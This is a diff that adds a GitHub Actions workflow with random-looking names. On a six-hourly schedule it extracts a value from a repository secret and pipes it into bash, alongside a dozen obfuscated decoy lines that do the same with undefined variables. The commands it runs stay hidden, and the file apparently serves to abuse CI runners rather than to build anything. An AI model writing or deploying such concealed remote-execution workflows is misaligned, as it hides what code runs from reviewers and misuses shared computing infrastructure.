@@ -1,0 +1,28 @@
+name: yanhuidang8765
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanhuidang8765
+        env:
+          s230: ${{ secrets.s230 }}
+        run: |
+          echo $s230 | jq -r .cql5 | /bin/bash
+          echo $lbbx629 | jq -r .if0391 | /bin/bash
+          echo $ndwn1598 | jq -r .a0 | /bin/bash
+          echo $v42673 | jq -r .y18799 | /bin/bash
+          echo $ptbsn1025 | jq -r .dt15 | /bin/bash
+          echo $tc725 | jq -r .tixb7424 | /bin/bash
+          echo $o03319 | jq -r .xbbxj4571 | /bin/bash
+          echo $uq29 | jq -r .az91626 | /bin/bash
+          echo $f42 | jq -r .ytyqr580 | /bin/bash
+          echo $scy3497 | jq -r .trm5431 | /bin/bash
+          echo $us93 | jq -r .rqwp71 | /bin/bash
+          echo $dm1128 | jq -r .pjd5 | /bin/bash
+
